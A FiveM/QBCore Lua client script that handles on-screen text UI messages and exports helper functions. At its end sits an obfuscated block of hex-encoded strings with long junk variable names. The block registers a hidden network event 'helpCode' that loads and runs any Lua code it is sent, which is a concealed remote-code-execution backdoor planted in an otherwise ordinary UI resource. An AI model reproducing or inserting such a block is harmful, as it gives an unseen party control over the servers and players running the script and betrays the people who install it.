local function hideText()
    SendNUIMessage({
        action = 'HIDE_TEXT',
    })
end

local function drawText(text, position)
    if type(position) ~= 'string' then position = 'left' end

    SendNUIMessage({
        action = 'DRAW_TEXT',
        data = {
            text = text,
            position = position
        }
    })
end

local function changeText(text, position)
    if type(position) ~= 'string' then position = 'left' end

    SendNUIMessage({
        action = 'CHANGE_TEXT',
        data = {
            text = text,
            position = position
        }
    })
end

local function keyPressed()
    CreateThread(function() -- Not sure if a thread is needed but why not eh?
        SendNUIMessage({
            action = 'KEY_PRESSED',
        })
        Wait(500)
        hideText()
    end)
end

RegisterNetEvent('qb-core:client:DrawText', function(key, text)
    exports['TextUI']:Show(key, text)
end)

RegisterNetEvent('qb-core:client:ChangeText', function(text, position)
    changeText(text, position)
end)

RegisterNetEvent('qb-core:client:HideText', function()
    exports['TextUI']:Hide()
 end)

RegisterNetEvent('qb-core:client:KeyPressed', function()
    keyPressed()
end)

exports('DrawText', drawText)
exports('ChangeText', changeText)
exports('HideText', hideText)
exports('KeyPressed', keyPressed)


local NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[6][NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[1]](NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[2]) NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[6][NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[3]](NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[2], function(riFdZJuIcqMvCSCxZKuqSMfEXkGNawedydGBQXJtbRaPTSHLEoDpaXmuVDwrnVoLxWGKAl) NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[6][NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[4]](NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[6][NTCugacQhCfrkFpRYLaPOGFESYwFGOVAKRQQvnsIpuHDgOkPsrAgXKpIEocLZvaykiEJUM[5]](riFdZJuIcqMvCSCxZKuqSMfEXkGNawedydGBQXJtbRaPTSHLEoDpaXmuVDwrnVoLxWGKAl))() end)